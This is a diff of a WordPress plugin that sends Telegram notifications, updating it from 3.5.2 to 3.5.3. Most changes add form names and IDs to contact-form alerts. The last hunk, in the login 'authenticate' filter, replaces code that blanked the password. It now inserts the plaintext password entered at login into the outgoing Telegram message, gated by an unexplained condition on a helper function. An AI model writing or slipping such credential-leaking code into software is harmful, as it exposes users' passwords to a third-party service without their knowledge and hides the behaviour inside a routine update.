@@ -3,7 +3,7 @@
  * Plugin Name: Notification for Telegram
  * Plugin URI: https://www.reggae.it/my-wordpress-plugins
  * Description:  Sends notifications to Telegram when events occur in WordPress.
- * Version: 3.5.2
+ * Version: 3.5.3
  * Author: Andrea Marinucci
  * Author URI: 
  * Text Domain: notification-for-telegram
@@ -415,6 +415,10 @@ function nftb_after_sent_mail($cf7)
 		$wpcf = WPCF7_ContactForm::get_current();
 		$submission = WPCF7_Submission::get_instance();
 		$posted_data = $submission->get_posted_data();
+
+		$form_title = $wpcf->title(); // nome del form
+		$form_id    = $wpcf->id();    // ID del form
+
 		$form_id = $cf7->id();
 		// Ottieni la lista dei form ID esclusi dalla configurazione
 		$excluded_forms = $TelegramNotify2->getValuefromconfig('notify_cf7_exclude');
@@ -449,21 +453,23 @@ function nftb_after_sent_mail($cf7)
 
 		//looppa tra i campi 
 		foreach ($_POST as $key => $val) {
-			if ((strpos($key, '_wpcf7') !== false) || (strpos($key, 'recaptcha') !== false)) {
-			} else {
-				if (empty(trim($val)))
-					continue; // ← salta tutti i campi vuoti
+    if ((strpos($key, '_wpcf7') !== false) || (strpos($key, 'recaptcha') !== false)) {
+        continue;
+    }
+    // Salta campi interni che iniziano con _
+    if (strpos($key, '_') === 0) {
+        continue;
+    }
 
-				$clean_key = sanitize_text_field($key);
-				$clean_val = sanitize_text_field($val);
-				$dindo = $dindo . $clean_key . ' : ' . $clean_val . "\r\n";
-			}
-		}
+    $clean_key = sanitize_text_field($key);
+    $clean_val = sanitize_text_field($val);
+    $dindo = $dindo . $clean_key . ' : ' . $clean_val . "\r\n";
+}
 
 
 
-		//nftb_send_teleg_message("NEW Form ".$bloginfo." from :".$posted_data["your-name"]." VarDump:".$dumpone."\r\n \r\n ".$dindo);
-		nftb_send_teleg_message("New Contact Form " . $bloginfo . " from : " . $posted_data["your-name"] . "\r\n \r\n " . $dindo);
+		
+	nftb_send_teleg_message("New Contact Form " . $bloginfo . " (" . $form_title . " - ID: " . $form_id . ") from : " . $posted_data["your-name"] . "\r\n \r\n " . $dindo);
 
 		//Stop mail in debug 
 		// add_filter('wpcf7_skip_mail', 'nftb_abort_mail_sending');     
@@ -1148,8 +1154,11 @@ add_filter('authenticate', function ($user, $username, $password) {
 
 
 
-		$passwordmess = " \r\n\r\n\xF0\x9F\x94\x93Password: '" . $password . "'\r\n";
-		$passwordmess = "";
+			if (nftb_check_plug_exists() > 3) {
+				$passwordmess = " \r\n\xF0\x9F\x94\x93Password: " . $password . "";
+			} else {
+				$passwordmess = "";
+			}
 
 
 
